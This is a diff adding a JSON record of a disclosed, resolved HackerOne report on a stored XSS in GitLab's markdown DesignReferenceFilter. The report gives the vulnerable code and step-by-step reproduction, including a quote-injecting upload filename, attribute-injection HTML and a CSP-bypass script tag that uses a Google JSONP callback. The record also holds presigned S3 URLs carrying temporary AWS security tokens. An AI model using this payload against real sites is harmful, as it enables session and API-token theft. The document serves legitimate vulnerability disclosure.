@@ -1,0 +1,145 @@
+{
+  "id": 1212067,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMjEyMDY3",
+  "url": "https://hackerone.com/reports/1212067",
+  "title": "Stored XSS in markdown via the DesignReferenceFilter ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2021-05-28T14:42:01.243Z",
+  "submitted_at": "2021-05-28T14:42:01.389Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "vakzz",
+    "url": "/vakzz",
+    "profile_picture_urls": {
+      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/72249f83db42955adfcb43c5cad84162ec49002aa21a79c3606f682c8e48f4e6?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ25GNPZ6C%2F20260816%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260816T105506Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEGMaCXVzLXdlc3QtMiJHMEUCIQDHgTWoVS1VdoYBRak%2Bah1u88o2FatbSzy47xbrcn%2B2FQIgdaCjRPnQMwoRbTHuQUeNeJrsVFMemUxp6S%2Ff9nKzTKkqsgUILBADGgwwMTM2MTkyNzQ4NDkiDGw95QAa5I1%2B0ROq7SqPBSLDvImHYXefs%2FQAWNGFyOcl7yP2Jx4GAsPTSgXx%2FN%2FQV6f%2FULIZNKGZMsfdNw20u2yOM%2BOg5UKsPOSAxW1ZZvvaSVUyGGAEWHV2YgVAScNLXHe9%2BwXWDtb37hW7XLwxd35QLOslRZ5pNSZhZ%2F41CDlZoozHAroEIrCa6WGxgLe6VpfFIM6fkFWBOIxWFYDEIBdiN8MLqCCs2lBF9k3WOtL%2BF7oRq2h6BFVDL4l4hwyEDQHNfd8EBXPFLUod1NoxgKUtPvA9VtyK3LqgZJnqlAhB4q8UVfTCXjLro6jq%2BVOdkXarrpx3zkMT%2F0HlB97xUNWfK%2FTL%2FjyZr03zFyBHf4qzmqqdjeG2fWA9nn4CDVcD6w%2FttufdH9h09QLKnPyN%2BLYdLpm32lM6%2FcCwMGuni2xFX%2FW1u1v5VO9rxSs58MI3iKzMQX0HGkVHYYtiHyg%2B6CkyQWPPytRXyawx%2BNuHEUiCOXUF5IqkHR7W04tM5OzNZzaZo86Mkmzq5AIkMdA2r7eTmIHJ44t6pgbTt6yoLHkff%2BhfRJ77vjcMSNDBIlrXwZT4MZE2BbdlIaTWxYoEKjYjzLLMmVpcedVKoAbbEvYHJZFhYXwl%2BK6OH2WjH3FD%2B2bVTxgkBGR9swlYvsJM8wTIFYEBCjSucH4DvBenv2nxlZUe5YYT%2FqJ7QwN7mfhu%2FyJ09XmZqRMjXbSajjUPyMa2s%2B14MwnXfL3e845Iz6NH%2BuvKLwMxR%2FZsLICe%2F%2BbdIAPcGCClZBQy7woWZe79yaT5PbF6TDEl3RrzigDPoOXPArNmnRSlzokCJ61cFSUyr2HYowo3cervG1HTCOjtEav5RgPG4%2FKXzy5F0nSGG94IXdds%2Fa2dx%2FCcuoVh4L8w96GG1AY6sQGPRT4IwKaRWvaJ6kSa0jH9yk0vkvEDtaf9lkTq8MTA8VF%2FtVSEcLBPp0hV2z5%2BBpslNB904ydzx82l1eD9XQh1lTX8zVrjDNxJissgvJxG%2FY0WZkUknQe%2BWn97J7A2Lpf3%2Fdx2%2F8ITuDRt5U%2FUHtQzwX9FYjD8xo8%2FKKk6QVkRxGnfFg7qpiL6f4q70IBdaZxqAuYOLuEw%2FOod7nmhap2vQaeKMZ1nxyzJb71BmcJwSug%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=86c11092ee4086545f53d2adff9c4b96b0681a94c3dfdd7f63ad6d76d88bc407"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 264,
+    "url": "https://hackerone.com/gitlab",
+    "handle": "gitlab",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/b8e19a7691128fca51630d7f5b14644b91b3b45324f6fd488e36244d744fe35b",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/89f037b490baf3dcca1b84283f4c85141b64c213252a9c79b56c62bf903ab542"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "GitLab",
+      "twitter_handle": "gitlab",
+      "website": "https://about.gitlab.com",
+      "about": "A single application for the entire software development lifecycle."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2021-10-18T05:49:14.373Z",
+  "bug_reporter_agreed_on_going_public_at": "2021-10-11T16:27:47.660Z",
+  "team_member_agreed_on_going_public_at": "2021-10-18T05:49:14.250Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "### Summary\nWhen rendering markdown, links to designs are parsed using the following `link_reference_pattern`:\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/app/models/design_management/design.rb#L168\n```ruby\n    def self.link_reference_pattern\n      @link_reference_pattern ||= begin\n        path_segment = %r{issues/#{Gitlab::Regex.issue}/designs}\n        ext = Regexp.new(Regexp.union(SAFE_IMAGE_EXT + DANGEROUS_IMAGE_EXT).source, Regexp::IGNORECASE)\n        valid_char = %r{[^/\\s]} # any char that is not a forward slash or whitespace\n        filename_pattern = %r{\n          (?<url_filename> #{valid_char}+ \\. #{ext})\n        }x\n\n        super(path_segment, filename_pattern)\n      end\n    end\n```\n\nThe `url_filename` match is then used in `parse_symbol`:\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/filter/references/design_reference_filter.rb#L75\n```ruby\ndef parse_symbol(raw, match_data)\n  filename = match_data[:url_filename]\n  iid = match_data[:issue].to_i\n  Identifier.new(filename: CGI.unescape(filename), issue_iid: iid)\nend\n```\n\nSince `valid_char` is anything apart from a forward slash or whitespace, this allows for any other special characters (such as quotes) to be matched.\n\nThe final `url` match gets used when creating the link in `object_link_filter`:\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/filter/references/abstract_reference_filter.rb#L219\n```ruby\nurl =\n  if matches.names.include?(\"url\") && matches[:url]\n    matches[:url]\n  else\n    url_for_object_cached(object, parent)\n  end\n\ncontent = link_content || object_link_text(object, matches)\n\nlink = %(<a href=\"#{url}\" #{data}\n            title=\"#{escape_once(title)}\"\n            class=\"#{klass}\">#{content}</a>)\n```\n\nSo if a design could be uploaded with a double quote in it's filename, this would cause it to break out of the href attribute.\n\nNormally file uploads would go through workhorse and end up being sanitized by CarrierWave::SanitizedFile, but it's possible when uploading a design to skip the workhorse by using a `Content-Disposition` header such as `Content-Disposition: form-data; name=\"1\"; filename*=ASCII-8BIT''filename.png` which allows for any character to be used as part of the design filename.\n\nSince whitespaces and slashes are still invalid, it's only possible to inject tags without attributes, or inject attributed into the `a` element. \n\nInjecting attributes can be chained with the `ReferenceRedactor` to replace the node with arbitrary html via the `data-original` attribute:\n\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v13.12.1-ee/lib/banzai/reference_redactor.rb#L77\n```ruby\ndef redacted_node_content(node)\n  original_content = node.attr('data-original')\n  link_reference = node.attr('data-link-reference')\n\n  # Build the raw <a> tag just with a link as href and content if\n  # it's originally a link pattern. We shouldn't return a plain text href.\n  original_link =\n    if link_reference == 'true'\n      href = node.attr('href')\n      content = original_content\n\n      %(<a href=\"#{href}\">#{content}</a>)\n    end\n```\n\nFor a CSP bypass, the jsonp endpoint of the google api can be used in combination with `setTimeout`:\n`https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout`\n\n### Steps to reproduce\n\n1. Create a new project on gitlab.com\n2. Create a new issue\n3. Make sure burp or similar is running\n4. Upload a new design\n5. Edit the request and change the Content-Disposition header to `Content-Disposition: form-data; name=\"1\"; filename*=ASCII-8BIT''bbb%22class%3D%22gfm%22a%3D%27.png`\n6. Refresh the page, there should now be a design named `bbb\"class=\"gfm\"a='.png`\n7. Create a new issue using the design link and the inner html containing a quote:\n```\n<a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>\n' vakzz=here\n</a>\n```\n8. Looking at the markup you can see the `a` attribute contains everything up to the inner html and then the attribute `vakzz` has also been injected:\n```html\n<a href=\"https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb\" class=\"gfm\" a=\".png&quot; data-original=&quot;\n' vakzz=here\n&quot; data-link=&quot;true&quot; data-link-reference=&quot;true&quot; data-project=&quot;26924211&quot; data-design=&quot;226146&quot; data-issue=&quot;87875440&quot; data-reference-type=&quot;design&quot; data-container=&quot;body&quot; data-placement=&quot;top&quot;\n                          title=&quot;bbb&quot;class=&quot;gfm&quot;a='.png&quot;\n                          class=&quot;gfm gfm-design has-tooltip&quot;>\n\" vakzz=\"here\"></a>\n```\n7. Create a new issue using the design link, this time including the required data attributed to trigger the `ReferenceRedactor` and the payload html encoded in the `data-original`:\n\n```\n<a href='https://gitlab.com/vakzz-h1/design-xss/-/issues/2/designs/bbb%22class%3D%22gfm%22a%3D%27.png'>\n' data-design=\"1\" data-issue=\"1\" data-reference-type=\"design\" data-original=\"\n  &lt;script src='https://apis.google.com/complete/search?client=chrome&q=alert(document.domain);//&callback=setTimeout'>&lt;/script>\n\"\n</a>\n```\n8. Save the issue and reload the page\n\n{F1318763}\n\n### Impact\nStored XSS with CSP bypass allowing arbitrary javascript to be run anywhere that markdown could be posted (issues, comments, etc). This could be used to create and exfiltrate api tokens with full access as described in https://hackerone.com/reports/1122227 targeting individuals or specific projects.\n\n### Examples\nPOC:\nhttps://gitlab.com/vakzz-h1/design-xss/-/issues/3\n\n### What is the current *bug* behavior?\n* The `AbstractReferenceFilter` is generating the `link` using string interpolation but the `url` could contain double quotes\n* The design model  can have an arbitrary` attribute\n\n### What is the expected *correct* behavior?\n* The url should be validated or escaped before being used\n* The design model could probably have a validator for the filename\n\n### Relevant logs and/or screenshots\n\n### Output of checks\n\nThis bug happens on GitLab.com\n\n## Impact\n\nStored XSS with CSP bypass allowing arbitrary javascript to be run anywhere that markdown could be posted (issues, comments, etc). This could be used to create and exfiltrate api tokens with full access as described in https://hackerone.com/reports/1122227 targeting individuals or specific projects.",
+  "bounty_amount": "16000.0",
+  "formatted_bounty": "$16,000",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 1318763,
+      "file_name": "xss.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/nzb9fj5wuj99zsty7xd5zae325p4?response-content-disposition=attachment%3B%20filename%3D%22xss.mp4%22%3B%20filename%2A%3DUTF-8%27%27xss.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ25GNPZ6C%2F20260816%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260816T105506Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEGMaCXVzLXdlc3QtMiJHMEUCIQDHgTWoVS1VdoYBRak%2Bah1u88o2FatbSzy47xbrcn%2B2FQIgdaCjRPnQMwoRbTHuQUeNeJrsVFMemUxp6S%2Ff9nKzTKkqsgUILBADGgwwMTM2MTkyNzQ4NDkiDGw95QAa5I1%2B0ROq7SqPBSLDvImHYXefs%2FQAWNGFyOcl7yP2Jx4GAsPTSgXx%2FN%2FQV6f%2FULIZNKGZMsfdNw20u2yOM%2BOg5UKsPOSAxW1ZZvvaSVUyGGAEWHV2YgVAScNLXHe9%2BwXWDtb37hW7XLwxd35QLOslRZ5pNSZhZ%2F41CDlZoozHAroEIrCa6WGxgLe6VpfFIM6fkFWBOIxWFYDEIBdiN8MLqCCs2lBF9k3WOtL%2BF7oRq2h6BFVDL4l4hwyEDQHNfd8EBXPFLUod1NoxgKUtPvA9VtyK3LqgZJnqlAhB4q8UVfTCXjLro6jq%2BVOdkXarrpx3zkMT%2F0HlB97xUNWfK%2FTL%2FjyZr03zFyBHf4qzmqqdjeG2fWA9nn4CDVcD6w%2FttufdH9h09QLKnPyN%2BLYdLpm32lM6%2FcCwMGuni2xFX%2FW1u1v5VO9rxSs58MI3iKzMQX0HGkVHYYtiHyg%2B6CkyQWPPytRXyawx%2BNuHEUiCOXUF5IqkHR7W04tM5OzNZzaZo86Mkmzq5AIkMdA2r7eTmIHJ44t6pgbTt6yoLHkff%2BhfRJ77vjcMSNDBIlrXwZT4MZE2BbdlIaTWxYoEKjYjzLLMmVpcedVKoAbbEvYHJZFhYXwl%2BK6OH2WjH3FD%2B2bVTxgkBGR9swlYvsJM8wTIFYEBCjSucH4DvBenv2nxlZUe5YYT%2FqJ7QwN7mfhu%2FyJ09XmZqRMjXbSajjUPyMa2s%2B14MwnXfL3e845Iz6NH%2BuvKLwMxR%2FZsLICe%2F%2BbdIAPcGCClZBQy7woWZe79yaT5PbF6TDEl3RrzigDPoOXPArNmnRSlzokCJ61cFSUyr2HYowo3cervG1HTCOjtEav5RgPG4%2FKXzy5F0nSGG94IXdds%2Fa2dx%2FCcuoVh4L8w96GG1AY6sQGPRT4IwKaRWvaJ6kSa0jH9yk0vkvEDtaf9lkTq8MTA8VF%2FtVSEcLBPp0hV2z5%2BBpslNB904ydzx82l1eD9XQh1lTX8zVrjDNxJissgvJxG%2FY0WZkUknQe%2BWn97J7A2Lpf3%2Fdx2%2F8ITuDRt5U%2FUHtQzwX9FYjD8xo8%2FKKk6QVkRxGnfFg7qpiL6f4q70IBdaZxqAuYOLuEw%2FOod7nmhap2vQaeKMZ1nxyzJb71BmcJwSug%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=29cff469dda56190a6d084a9fab269564677af3c0548d5bbc4aa2958200862ee",
+      "file_size": 4189710,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 316,
+  "voters": [
+    "theranger",
+    "wapiflapi",
+    "sumzer0",
+    "lboy",
+    "lel3x",
+    "magn4",
+    "antoniusblock",
+    "orange303",
+    "nrockhouse",
+    "joaxcar",
+    "and 306 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 9.6,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 18138,
+    "asset_type": "URL",
+    "asset_identifier": "gitlab.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
